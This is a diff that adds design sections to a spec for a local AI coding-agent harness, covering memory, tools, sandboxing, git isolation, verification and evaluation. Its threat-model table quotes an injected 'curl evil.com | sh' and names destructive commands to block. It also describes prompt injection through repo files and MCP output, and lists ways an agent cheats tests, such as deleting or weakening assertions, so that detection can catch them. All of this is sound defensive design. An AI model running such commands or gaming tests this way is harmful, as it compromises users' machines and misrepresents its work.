@@ -595,3 +595,390 @@ Stages are deterministic wrappers around runtime capabilities; only `implement`/
 
 Retrieval output (ranked symbols/files, not bodies) is capped as a fraction of effective context (§4.5: ~20% at 8k). It **scales down** automatically for small-context local models: fewer ranked entries, names+signatures only, no bodies until a file is explicitly opened into a window. On a frontier model the same budget is larger but the *never-dump-the-repo* rule (§4.5) still holds. **[C:High]**
 
+
+## 10. Memory
+
+Three tiers. For each: contents, storage, lifecycle, size cap, eviction. **The hard question this section answers honestly: what is committed to the repo, what stays in `~/.config`, what is disposable, what is never persisted — and how stale memory is corrected.**
+
+| Tier | Contents | Storage | Lifecycle | Cap / eviction |
+|---|---|---|---|---|
+| **Session** | current task state, transcript, tool results, compaction checkpoints | SQLite (run DB) + JSONL transcript, under `~/.local/state/clutchcode/runs/<run_id>/` | per-run; `resume` reads it; deletable | ring-buffer of raw tool output; compact history into checkpoints at token thresholds; raw provider responses evicted after redaction |
+| **Project** | repo conventions, build/test commands, layout facts, user-editable instructions | **`AGENTS.md` committed in the repo** (+ machine-derived cache in `~/.config`) | lives with the repo; edited by humans; PR-reviewed | human-bounded; machine cache TTL'd + invalidated on repo change |
+| **Long-term engineering** | prior runs, decisions, failed approaches, ADRs | SQLite (`~/.local/state/clutchcode/history.db`) + optional `docs/adr/` in repo | across runs; queried for "have we tried this?" | age/size-capped; summarized then pruned; never grows unbounded |
+
+### 10.1 Project-memory file: pick a standard, don't invent a fourth
+
+Conventions in the wild: `CLAUDE.md` (Claude Code), `.cursorrules` (Cursor), `AGENTS.md` (OpenAI/Codex + a growing cross-tool convention), `.aider.conf.yml`/`CONVENTIONS.md` (Aider). **We standardize on `AGENTS.md`.** **[C:High]** Reasons: it is the most *vendor-neutral* emerging convention (fits our positioning), it is already read by multiple tools (network effect for the user), and it avoids implying endorsement by any one vendor (LICENSE §6). We **also read `CLAUDE.md`/`.cursorrules` if present** (for users migrating), but our canonical, written-to file is `AGENTS.md`. We never invent a `.clutchcoderc` project-rules format.
+
+`AGENTS.md` contents (human-authored, agent-appended-with-consent): build/test/lint commands, directory conventions, "don't touch" areas, style rules, domain glossary. It is the single most cost-effective context input for a weak model — a good `AGENTS.md` is worth more than a bigger model on Profile B.
+
+### 10.2 What is committed vs local vs disposable vs never-persisted
+
+- **Committed to the user's repo:** `AGENTS.md` (project memory), optionally `docs/adr/*` (long-term decisions), and — only on approval — the actual code diff. Nothing else. **[C:High]**
+- **In `~/.config/clutchcode` (local, not committed):** global config, credentials (§5), per-model capability profiles (§4.9), the machine-derived project cache (detected toolchain, symbol cache).
+- **In `~/.local/state/clutchcode` (local, disposable):** per-run transcripts, traces, worktree metadata. Safe to delete; `agent inspect` reads them.
+- **Never persisted anywhere:** secrets (redacted pre-write, §5.2), raw provider responses that contain secrets, and the contents of denylisted files. **[C:High]**
+
+### 10.3 Correcting stale memory (most systems ignore this)
+
+Stale memory is worse than none. Mechanisms:
+
+1. **Provenance + timestamps.** Every machine-derived project fact stores `{value, derived_at, source}`. The build command in the cache says *how* it was learned (e.g., "from package.json scripts.test @ commit abc").
+2. **Invalidation on change.** The project cache is keyed by the files it was derived from; editing `package.json`/`pyproject.toml`/CI config invalidates the derived test/build command.
+3. **Verification is the truth oracle.** If memory says "test command = X" and X fails to run (environment error, §6.8), memory is marked stale and re-derived (§14 toolchain autodetect), not trusted.
+4. **Human edits win.** `AGENTS.md` is human-authored and overrides machine-derived cache on conflict.
+5. **`agent memory` command** (§18) lists, shows provenance, and lets the user forget/correct a fact. **[C:High]**
+
+---
+
+## 11. Tool System
+
+One unified tool interface. Minimum set (MVP): filesystem read/write/edit · shell · git · search · process management · test runner · package manager · web-fetch (**optional, off by default**).
+
+### 11.1 Tool interface
+
+```
+interface Tool<Args, Result> {
+  name; description; schema: JSONSchema<Args>;   // schema drives native tool-calling AND the text-protocol/GBNF grammar
+  permissionClass: READ | WRITE | EXECUTE | NETWORK;   // §12 policy engine
+  idempotent: boolean;                                 // safe to retry?
+  validate(args): Result<Args, ValidationError>;       // pre-exec arg validation
+  run(args, ctx): Promise<ToolResult>;                 // ctx = sandboxed workspace handle
+  truncate(output): { shown, full_ref }                // §11.3 output policy
+}
+ToolResult = { ok, data|error, truncated?, evidence_ref? }  // typed error contract, never a bare string
+```
+
+Per-tool specifics:
+
+| Tool | Perm | Idempotent | Output truncation | Error contract |
+|---|---|---|---|---|
+| `read_file(path, window?)` | READ | yes | window + "N more lines" ref | not-found / denylisted / too-large |
+| `write_file(path, body)` | WRITE | no | n/a | denied-path / would-exceed-cap |
+| `edit_file(path, edits)` | WRITE | no (but re-appliable) | per §4.4 | which SEARCH block failed |
+| `search(pattern, glob?)` | READ | yes | top-K matches + count | bad-regex |
+| `shell(cmd, timeout)` | EXECUTE | no | §11.3 | nonzero-exit (with code), timeout, killed |
+| `run_tests(selector?)` | EXECUTE | no | failures first, §11.3 | test-detect-failure vs run-error (distinct) |
+| `package_manager(op)` | EXECUTE+NETWORK | no | §11.3 | network-denied / resolve-fail |
+| `git(op)` | EXECUTE | varies | diff-stat + capped | not-a-repo / conflict |
+| `process(list/kill)` | EXECUTE | yes | table | no-such-process |
+| `web_fetch(url)` | NETWORK | yes | text-extracted + capped | **off by default**; blocked-by-egress |
+
+### 11.2 Tool schemas: native vs MCP vs plugin vs subprocess
+
+| Mechanism | Role | Trust |
+|---|---|---|
+| **Native (built-in) tools** | the small, fast core set above | first-party, tested (§2) |
+| **MCP servers** | **the third-party extension boundary** | **arbitrary code + prompt-injection vector — untrusted** (§12) |
+| Plugins (in-process) | first-party/vetted extensions | trusted-ish; same process |
+| Subprocess tools | language-agnostic escape hatch (§19) | sandboxed like shell |
+
+**Recommendation:** a **small, fast, native core** + **MCP as the third-party extension boundary.** New third-party tools are added by pointing config at an MCP server — **no runtime change required.** But: **an MCP server is arbitrary code and a prompt-injection vector** (its tool descriptions and outputs enter context). Therefore MCP servers are (a) explicitly enabled in config, (b) run under the same egress/permission policy as any tool (§12), (c) their outputs pass through redaction (§5.2) and truncation (§11.3), and (d) their tool descriptions are treated as untrusted text (§12.1). We implement the **open MCP protocol** (LICENSE §2 — protocol conformance, not code copying). **[C:High]**
+
+### 11.3 Output truncation — a first-class design problem
+
+**A 50k-line test log must not destroy the context window.** Policy:
+
+```
+truncate(output, budget):
+  if len(output) <= budget: return output
+  strategy by tool:
+    tests/build: KEEP failures/errors (grep failure signatures), head+tail of the rest,
+                 drop the passing middle. "Showing 40 of 5,000 lines; 3 failures below."
+    logs/generic: head N + tail M + "... {skipped} lines ...", full output saved to
+                 evidence_ref on disk (retrievable by the model via read_file on the ref, windowed).
+    search: top-K by relevance + total count.
+  ALWAYS: the model is told it was truncated and how to get more (bounded), so it can
+          request a specific window instead of re-running the 20-min suite.
+```
+
+Truncation happens **at tool-output ingestion, before context assembly** — the raw output never transits context. This is mandatory for Profile B/C survival and beneficial everywhere. **[C:High]**
+
+---
+
+## 12. Sandbox & Security
+
+The agent executes LLM-generated commands. **Highest-risk subsystem.** Design for individual developers on laptops — where **Docker is not a free default.**
+
+### 12.1 Threat models (each: control + residual risk)
+
+| Threat | Control | Residual risk |
+|---|---|---|
+| **Prompt injection via repo contents** (README, comments, test fixtures, dependency source, MCP output) | Untrusted-by-default repo mode (§12.4); repo text is *data, not instructions* (the runtime never elevates repo/tool text to system-instruction status); network default-deny so an injected "curl evil.com \| sh" is blocked; destructive-command gate | A cleverly injected instruction can still waste steps or attempt allowed actions; **cannot be fully eliminated** — we contain blast radius, not prevent influence |
+| **Secret exfiltration** | denylist (§5.3) + redaction (§5.2) + **network default-deny** (can't POST secrets out) + no telemetry | An allowed egress host (e.g., approved package registry) could in principle be abused; residual, logged |
+| **Destructive shell** (`rm -rf`, `git push --force`, `dd`, `mkfs`) | destructive-command detector → **always ask** (even in permissive modes); worktree isolation (§13) limits damage | A novel destructive command not pattern-matched; mitigated by fs confinement |
+| **Supply-chain / dependency attack** | package installs are EXECUTE+NETWORK, gated; lockfile-respecting; network allowlist; run installs sandboxed | A malicious postinstall within an allowed registry package; residual — same risk the user already runs |
+| **Network abuse** | egress **default-deny + allowlist** | allowlisted host abuse; residual |
+| **Credential theft** | denylist + sandbox fs confinement + child-env scrubbing (§12.3) | a compromised *allowed* tool; residual |
+| **Agent editing its own config/permissions** | config + policy files are **denylisted for writes**; permission rules live outside the workspace and are not agent-writable | user running in `bypass` mode removes this; documented |
+| **Malicious workflow/skill files shared between users** | workflows are declarative + schema-validated (§8) — **not arbitrary code**; imported workflows are untrusted, sandboxed, and their commands gated; MCP servers require explicit enable | a user who hand-approves a malicious workflow's commands; social-engineering residual |
+
+### 12.2 Permission classes & policy engine
+
+```
+Policy engine: for each tool call → decision ∈ { ALLOW, ASK, DENY }
+  keyed by (permissionClass, specific-args, repo-trust-mode, sandbox-tier).
+Defaults (untrusted repo, §12.4):
+  READ (workspace, non-denylisted) → ALLOW
+  WRITE (workspace) → ALLOW (into worktree, §13) ; WRITE (outside workspace) → DENY
+  EXECUTE (non-destructive, sandboxed) → ASK (first time per command-class) then remember-per-run
+  EXECUTE (destructive pattern) → ASK always
+  NETWORK → DENY unless host ∈ allowlist → ASK
+Override: `agent config policy ...` ; every non-default decision is logged in the run (§15).
+```
+
+Approval fatigue is a real failure mode (§18.3): decisions are **remembered per command-class per run**, not asked every time, and grouped ("allow all `npm test` this run?").
+
+### 12.3 Filesystem confinement & child-env scrubbing
+
+- Writes confined to the **run's git worktree** (§13) + explicitly allowed paths. Reads confined to workspace minus denylist (§5.3).
+- **Child-process env scrubbing:** shell/tool children get a **minimal env** — no `*_API_KEY`, `AWS_*`, `GH_TOKEN`, etc. (allowlisted passthrough only: PATH, HOME-scoped, LANG…). Prevents a spawned command from reading keys out of the environment. Tested with the §5.2 canary. **[C:High]**
+
+### 12.4 Trusted vs untrusted repo modes
+
+- **Untrusted (default for a repo not previously marked trusted):** all of §12.2 defaults; network default-deny; destructive gate; MCP disabled unless enabled. `review-only` workflow (§8) is safe here.
+- **Trusted (user ran `agent trust` on this repo):** relaxes *some* ASKs to remembered-ALLOW, but **never** removes the destructive-command gate or network default-deny silently. Trust is per-repo, stored locally. **[C:High]**
+
+### 12.5 Isolation mechanisms — honest comparison for individual developers
+
+| Mechanism | Platforms | Startup cost | FS perf (macOS) | GPU passthrough (local model) | Strength | Laptop reality |
+|---|---|---|---|---|---|---|
+| **Plain process + policy** | all | ~0 | native | n/a | weak (policy-only) | always-on floor |
+| **macOS `sandbox-exec` (Seatbelt)** | macOS | low | native | host model unaffected | good fs/net confinement | **default on macOS** (deprecated API but works; Codex uses it) |
+| **Linux bubblewrap (bwrap)** | Linux | low | native | host model unaffected | good (namespaces, ro-binds) | **default on Linux** (Codex uses it) |
+| **Linux Landlock + seccomp** | Linux 5.13+ | low | native | unaffected | strong fs (Landlock) + syscall filter | layered under bwrap where available |
+| **Windows restricted token / AppContainer** | Windows | med | n/a | unaffected | medium | **[C:Low]** — weakest story; WSL2 preferred |
+| **WSL2** | Windows | med (VM) | good (in-distro) | CUDA works via WSL2 | good (real Linux sandbox inside) | **recommended path for Profile-B Windows** |
+| **Docker/Podman** | all | **high (daemon, image, mac fs is slow)** | **poor on macOS (virtiofs)** | **GPU passthrough painful, esp. macOS** | strong | **optional tier — NOT default**; many users disable it |
+| **microVM (Firecracker)** | Linux | high | good | complex | strongest | out of scope for individual-dev MVP |
+
+**Why Docker is not the default (contra OpenHands):** on a laptop it costs daemon startup, multi-GB images, slow bind-mount FS on macOS, and **fights local-model GPU passthrough** — so a large fraction of Profile-A/B users simply turn it off, leaving them *less* safe than a lightweight always-on OS sandbox. We make Docker an **opt-in stronger tier**, not the floor. **[C:High]**
+
+### 12.6 Tiered defaults (recommendation)
+
+```
+Tier 0 (always, all platforms): process isolation + policy engine + denylist + redaction
+                                 + destructive gate + network default-deny + child-env scrub.
+Tier 1 (default where available):
+   macOS  → Seatbelt (sandbox-exec) profile confining fs to worktree, deny net-by-default
+   Linux  → bubblewrap + Landlock + seccomp
+   Windows→ WSL2 (recommended) else restricted-token + ASK-heavy policy [C:Low]
+Tier 2 (opt-in stronger): Docker/Podman container runtime (for users who want it / untrusted code).
+Never allowed (any tier): writes outside worktree+allowlist; reads of denylist; egress to non-allowlisted host without approval; agent writing its own policy files.
+```
+
+Implementation note (LICENSE §3): sandbox tiers call OS primitives per their **own** man pages/docs; Codex's crates are **studied, not copied**; Seatbelt policy strings and Landlock rulesets are authored independently. A small optional **native helper** (Rust) may back Linux Landlock/seccomp if the Node path is insufficient (§19 escape hatch). **[C:Med]** (Linux/macOS solid; Windows is the weak spot.)
+
+### 12.7 What this system does NOT protect against (be specific)
+
+- **A determined local attacker** who already has code execution on your machine — we are not a hypervisor.
+- **Prompt injection influencing *allowed* actions** — we shrink blast radius (network deny, worktree confinement, destructive gate) but cannot stop an injected instruction from, say, writing a plausible-but-wrong code change into the worktree (that is what the human diff review and verification are for, §14).
+- **Malicious dependencies executed with your normal permissions** in Tier 0/1 — a package postinstall runs with the same reach you already grant when you `npm install` yourself, minus network (if egress-denied) and minus keys (env-scrubbed). Tier 2 (Docker) narrows this further; we do not claim Tier 0/1 fully contains it.
+- **Kernel/sandbox-escape bugs** in Seatbelt/bwrap/Landlock/WSL2/Docker themselves.
+- **The user choosing `bypassPermissions`** — a documented foot-gun; we warn, we don't prevent.
+- **Side-channel / data-at-rest** on a compromised OS account.
+
+We claim **no security property we did not build a control for.** (Self-review Q7, §29.)
+
+---
+
+## 13. Git Architecture
+
+**Invariant: the user's main working tree and uncommitted changes can never be corrupted by an agent run.** Enforced by **git worktree isolation**. **[C:High]**
+
+### 13.1 Worktree isolation per run
+
+```
+On `agent run` in a git repo:
+  base = current HEAD (record base_commit in RunState)
+  branch = clutchcode/run-<short_run_id>-<slug>
+  worktree = git worktree add <state_dir>/wt/<run_id> -b <branch> <base>
+  ALL agent edits/commands happen inside <worktree>, never in the user's main tree.
+On finish: show diff (worktree vs base); on approve → merge/PR into user's branch; on reject → discard worktree.
+Cleanup: `git worktree remove` (or keep for `agent inspect`); branch retained until run is deleted.
+```
+
+The user's main tree is **read as a base** but never written. Their uncommitted changes are untouched because the worktree starts from a commit, not from their dirty state (see §13.4 for the dirty-tree case). **[C:High]**
+
+### 13.2 Commit granularity, messages, review UX
+
+- **Checkpoint commits inside the worktree** at each successful verify (so rollback is per-step). These are squashable on delivery.
+- **Commit message generation:** from the diff + task; conventional-commits style; **human-editable before the final commit** (never auto-push).
+- **Diff review UX:** terminal side-by-side/unified with syntax highlight (§18) and, in VS Code, the native diff view (§18.5). `agent diff` shows worktree-vs-base; `agent approve` merges; `agent reject` discards.
+
+### 13.3 Checkpointing & rollback (including untracked files)
+
+Rollback restores to a checkpoint including **untracked** files: checkpoints use `git stash create`/tree snapshots that capture untracked-but-not-ignored files, so an agent-created file can be rolled back. Ignored build artifacts are excluded by design. `agent rollback <checkpoint>` resets the worktree. **[C:Med]** (untracked-file rollback needs careful impl; specified, flagged for test.)
+
+### 13.4 The awkward cases (explicit)
+
+| Case | Handling |
+|---|---|
+| **Dirty working tree at start** | Detect; offer: (a) stash user changes and base the worktree on HEAD (default, safest), (b) base on a temp commit that includes the dirty state (opt-in), (c) abort. Never silently include or discard the user's uncommitted work. |
+| **Submodules** | Worktree inherits submodule pointers; agent edits to submodules are ASK+separate-commit; deep submodule work is Phase 2. |
+| **Git LFS** | LFS pointers respected; large binaries not read into context; edits to LFS files flagged. |
+| **Monorepos** | Worktree is repo-wide but the agent's fs/verification scope can be pinned to a subdir (`--scope path/`); test selection (§14) uses the subdir's toolchain. |
+| **`.gitignore`d build artifacts** | excluded from diff, context, and rollback-snapshot; the agent won't "edit" generated files by default. |
+| **Commit hooks** | pre-commit hooks run on the *final* approved commit (respect the user's hooks) but are **bypassed for internal checkpoint commits** (`--no-verify`) to avoid a slow hook firing 50× mid-run; disclosed. |
+| **Not a git repo at all** | Fallback: a **snapshot backup** of touched files to the state dir before first edit; "diff" is snapshot-vs-current; `agent rollback` restores snapshots; strongly recommend `git init`. Worktree isolation is unavailable, so the destructive-gate + backups carry more weight. **[C:Med]** |
+
+### 13.5 Delivery
+
+`agent commit` finalizes: squash checkpoints (optional), generate+edit message, run the user's pre-commit hooks, commit onto the user's branch (or a new branch). **PR preparation** (`agent pr`, Phase 2+): push + open a PR with a body summarizing the task, diff stats, and verification results — **never auto-pushes without explicit command.** **[C:High]**
+
+---
+
+## 14. Verification
+
+**First-class subsystem. "The agent said it was done" is not a completion signal.** **[C:High]**
+
+### 14.1 Pipeline
+
+```
+build → test → lint → typecheck → static-analysis → security-scan → diff-review → behavior-verification
+(each stage: deterministic where possible; model-based only for diff-review/behavior where judgment is needed)
+```
+
+### 14.2 Toolchain auto-detection (and override)
+
+```
+detect():
+  node → package.json scripts (test/build/lint); pnpm/yarn/npm by lockfile
+  python → pyproject/pytest.ini/tox; uv/poetry/pip by lockfile
+  rust → Cargo.toml (cargo test/clippy/build)
+  go → go.mod (go test/vet/build)
+  ...language table...
+  fallback: ask; persist the answer to project memory (§10) with provenance
+override: AGENTS.md commands win; `agent config test-cmd "..."` explicit override.
+```
+
+Detected commands are **cached with provenance** and re-derived when their source file changes (§10.3). **[C:High]**
+
+### 14.3 Deterministic vs model-based checks (correct roles)
+
+- **Deterministic (the gate):** build, tests, lint, typecheck, static analysis, security scan. These *decide* pass/fail. A model never overrides a deterministic failure.
+- **Model-based (advisory + judgment):** diff review (does the change match intent? is it minimal? does it introduce a smell?) and behavior verification (did we actually satisfy the task, beyond tests passing?). Model review **cannot mark a run successful on its own** — it can only *add* concerns or confirm intent once the deterministic gate is green.
+
+### 14.4 Test selection (don't run 20 min on a 1-line change)
+
+```
+select_tests(diff):
+  map changed files → impacted tests (by import graph §9 / path convention / test framework's own selection)
+  run the impacted subset first (fast feedback); run full suite before final approval (or on user request)
+  time-box: if impacted-subset run > threshold, warn and offer full-suite-in-background
+```
+
+**[C:Med]** (impact mapping is language-dependent; start with path+import heuristics, refine per-language.)
+
+### 14.5 Failure classification & repair loop
+
+```
+classify(failure): compile-error | test-assertion | test-error(env) | lint | typecheck | flaky?
+repair_loop:
+  analyze failing check (feed the FAILURE, truncated §11.3, not the whole log)
+  → targeted edit (§4.4) → re-verify (impacted subset)
+  hard cap: MAX_REPAIR_ITERS (default 3) → escalate to human with the standing failure
+  flaky detection: a test that passes on rerun without a code change is flagged, not "fixed"
+```
+
+### 14.6 Cheating detection (common, under-addressed)
+
+The agent must not "pass" by cheating. Detected against the **diff** (deterministic, not model-judgment):
+
+| Cheat | Detection |
+|---|---|
+| Deleting/commenting failing tests | diff touches test files by **removing** assertions/test cases while claiming a fix → **flag + block auto-success** |
+| Weakening assertions | assertion changed to be trivially true (`assert True`, `expect(x).toBeDefined()` replacing a real check) → flag |
+| Adding `skip`/`xfail`/`.only` | new skip/ignore markers in the diff → flag |
+| Catching & swallowing errors | new bare `except: pass` / empty catch around the failing path → flag |
+| Editing snapshots to match wrong output | snapshot/golden files changed alongside no corresponding source rationale → flag for explicit review |
+| Hardcoding expected outputs | function body replaced by a literal matching the test → heuristic flag |
+
+Any flag **forces human review** and blocks the "successful" completion contract, regardless of green tests. This is the single most valuable, most-neglected verification feature and a stated differentiator (§23). **[C:High]**
+
+### 14.7 The completion contract
+
+```
+A run is DONE-SUCCESS only if:
+  deterministic gate is green (build+test+lint+typecheck as applicable)
+  AND no cheating flags (§14.6)
+  AND the human approved the diff (§18.3)   # human-in-the-loop is part of the contract for MVP
+Otherwise: DONE-ESCALATED (with the standing reason) or FAILED. Never "success on the model's word."
+```
+
+`agent run --yes` (CI/non-interactive) can drop the human-approval clause **only** if the deterministic gate + no-cheat conditions hold and the user opted in; still records everything (§15). **[C:High]**
+
+---
+
+## 15. Observability
+
+Every run emits structured events. **No telemetry to any server — there are no servers (§19, §21).** **[C:High]**
+
+### 15.1 Event model
+
+```
+Event { run_id, seq, ts, type, data }   # append-only JSONL per run + indexed in SQLite
+types: run.start, state.transition, plan.created, model.request, model.response(usage),
+       tool.call, tool.result(truncated), command.exec, edit.apply, verify.stage,
+       cheat.flag, budget.hit, loop.detected, escalation, approval, commit, run.end.
+Run record (SQLite, queryable): run_id · task · workflow · provider · model · capability_profile ·
+  tokens_in/out/cached · cost · latency · #tool_calls · #commands · files_changed · diff_stats ·
+  tests_run/passed/failed · retries · escalations · final_status · termination_reason.
+```
+
+### 15.2 OpenTelemetry vs local JSONL+SQLite
+
+| | Local JSONL + SQLite | OpenTelemetry |
+|---|---|---|
+| Fits "local-first, single-user, no servers" | **yes** | designed for distributed collectors |
+| Dependency weight | tiny | heavy (SDK, exporters) |
+| Query "why did it change this?" | direct (replay §15.3) | needs a backend |
+| Ecosystem/dashboards | DIY | rich |
+
+**Recommendation: local JSONL + SQLite as the core; OpenTelemetry as an *optional exporter* only** (for the rare power user who wants to pipe to their own collector). OTel does not earn its dependency weight as a default for a single-user local tool. **[C:High]**
+
+### 15.3 Replay & inspection
+
+`agent inspect <run_id>` browses the decision trail: the plan, each model request/response (redacted §5.2), each tool call + result, each verify stage, cheat flags, and the final diff — answering **"why did the agent make this change?"** by walking the recorded events. Transcripts are stored redacted; raw provider responses containing secrets are never persisted (§10.2). The same recorded transcript drives **replay testing** against the FakeProvider (§2, §16.3). **[C:High]**
+
+---
+
+## 16. Evaluation — the North Star
+
+**A harness with no eval loop cannot be improved.** **[C:High]**
+
+### 16.1 North Star metric
+
+**Verified Task Completion Rate (VTCR):** the fraction of eval tasks the harness completes such that the **deterministic verification gate passes and no cheating flags fire** (§14.7) — reported **per hardware/model tier (A–D)**.
+
+The product's central claim — *"this makes small local models usable"* — is operationalized as: **VTCR of a 14B-class local model *with the ClutchCode harness* materially exceeds the same model's single-shot/naked VTCR**, and approaches a usable absolute level on our realistic-task suite. If that delta is not real and measurable, the project has no reason to exist (§23). **[C:High]**
+
+### 16.2 Supporting metrics (3–5)
+
+1. **Edit-format accuracy** (applied-edits / attempted) per model — the strongest predictor (§4.3).
+2. **Cheat rate** (cheat flags per solved task) — must stay ~0; a rising cheat rate is a regression.
+3. **Cost per solved task** (API tiers) / **wall-clock per solved task** (local tiers).
+4. **Human-intervention rate** (escalations + approvals-with-edits per task) — lower = more autonomous, but never at the expense of cheat rate.
+5. **Retrieval sufficiency** (tasks failed due to missing context) — the trigger metric for §9's tier escalation / the (still-unjustified) vector DB.
+
+### 16.3 Eval infrastructure
+
+```
+(a) Local benchmark suite:
+    - SWE-bench Verified subset (a small, curated slice — full SWE-bench is heavy; run a representative N)
+    - Terminal-Bench-style tasks (shell/tooling tasks)
+    - a hand-built suite of realistic individual-developer repo tasks (bug fix, small feature, refactor,
+      test-add, dependency bump) across languages — THE most representative for our user.
+(b) Per-model scoreboard: VTCR + the §16.2 metrics, per model, stored in the run DB; `agent eval` runs it.
+(c) Runtime regression harness (no tokens, deterministic):
+    recorded transcripts replayed against FakeProvider (§2). Runtime changes (state machine, budgets,
+    loop detection, verification, git, redaction canary §5.2) are tested WITHOUT spending tokens or
+    hitting model nondeterminism. This is what makes the runtime safe to refactor.
+```
+
+**Placement (critical):** the **runtime regression harness (16.3c) lands in Phase 1–2**, and the **model scoreboard (16.3b) lands by Phase 4** so it can *guide* verification/git/memory work (Phases 4–7). Eval is not a late phase — see §25. **[C:High]**
+
+### 16.4 Proving "makes small local models usable"
+
+A/B on the realistic-task suite: **model X (14B Q4, Profile B) naked single-shot vs model X under ClutchCode** (capability probe + edit-format fallback + verification repair + context budgeting). Report the VTCR delta with confidence intervals over repeated runs (local models are nondeterministic; average over K seeds). Publish the methodology so the claim is falsifiable. **[C:High]**
+
